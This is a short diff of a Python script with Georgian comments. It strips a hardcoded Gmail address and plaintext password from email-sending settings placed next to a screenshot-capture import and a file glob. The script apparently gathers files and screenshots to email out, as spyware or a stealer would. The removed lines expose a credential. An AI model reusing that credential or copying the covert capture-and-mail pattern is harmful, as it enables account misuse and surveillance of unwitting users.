@@ -220,9 +220,9 @@ for x in glob(Full_path):
 # don't forgot to active  https://www.google.com/settings/security/lesssecureapps
 
 #ემაილის გაგზავნა
-addr_from = 'cryptona13@gmail.com' 
-addr_to  =  'cryptona13@gmail.com' 
-password  = 'cryptona13123' 
+addr_from = '' 
+addr_to  =  '' 
+password  = '' 
 
 #დავაიმპორტოთ ბიბლიოთეკა რომელიც სკრინშოტის გადაღების საშვალებას გვაძლევს
 from PIL import ImageGrab
